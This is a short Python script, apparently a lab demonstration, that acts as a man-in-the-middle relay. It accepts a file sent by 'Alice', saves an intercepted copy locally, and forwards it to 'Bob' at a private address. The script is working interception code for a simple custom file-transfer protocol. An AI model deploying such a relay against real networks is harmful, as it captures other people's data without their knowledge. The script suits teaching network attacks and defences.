import argparse
import socket
from pathlib import Path


def recv_exact(conn, size):
    chunks = []
    received = 0
    while received < size:
        chunk = conn.recv(size - received)
        if not chunk:
            raise ConnectionError("Connection closed before receiving enough data")
        chunks.append(chunk)
        received += len(chunk)
    return b"".join(chunks)


def receive_from_alice(listen_host, listen_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((listen_host, listen_port))
        server.listen(1)
        print(f"MITM relay listening on {listen_host}:{listen_port}")
        conn, addr = server.accept()
        with conn:
            print(f"Accepted connection from Alice: {addr}")
            name_len = int.from_bytes(recv_exact(conn, 2), "big")
            file_name = recv_exact(conn, name_len).decode("utf-8")
            data_len = int.from_bytes(recv_exact(conn, 8), "big")
            data = recv_exact(conn, data_len)

    Path(file_name).write_bytes(data)
    print(f"Attacker intercepted file: {file_name}")
    print(f"Bytes intercepted: {len(data)}")
    return file_name, data


def forward_to_bob(file_name, data, bob_host, bob_port):
    name = file_name.encode("utf-8")
    with socket.create_connection((bob_host, bob_port), timeout=10) as sock:
        sock.sendall(len(name).to_bytes(2, "big"))
        sock.sendall(name)
        sock.sendall(len(data).to_bytes(8, "big"))
        sock.sendall(data)
    print(f"Forwarded {file_name} to Bob at {bob_host}:{bob_port}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", type=int, default=9000)
    parser.add_argument("--bob-host", default="192.168.100.20")
    parser.add_argument("--bob-port", type=int, default=9001)
    args = parser.parse_args()

    file_name, data = receive_from_alice(args.listen_host, args.listen_port)
    forward_to_bob(file_name, data, args.bob_host, args.bob_port)
    print("MITM relay done")


if __name__ == "__main__":
    main()
